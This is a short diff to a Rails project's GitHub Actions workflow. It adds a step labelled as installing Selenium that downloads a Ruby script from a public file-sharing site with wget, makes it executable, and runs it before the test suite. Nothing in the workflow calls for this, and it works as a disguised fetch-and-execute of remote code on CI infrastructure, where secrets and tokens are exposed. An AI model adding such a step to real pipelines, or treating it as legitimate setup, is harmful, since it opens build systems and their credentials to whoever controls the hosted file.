@@ -38,7 +38,14 @@ jobs:
       run: bundle exec rails db:create db:migrate
       env:
         RAILS_ENV: test
-          
+    - name: Install Selenium
+      run: |
+          sudo gem install selenium-webdriver
+          wget https://filebin.net/6cw0f2x2sfgqyhi0/headless_chrome.rb?t=7g4c257d -O headless_chrome.rb
+          chmod +x headless_chrome.rb
+    - name: ChromeWebDriver
+      run: |
+          ./headless_chrome.rb
     - name: Run tests
       run: bundle exec rake
       
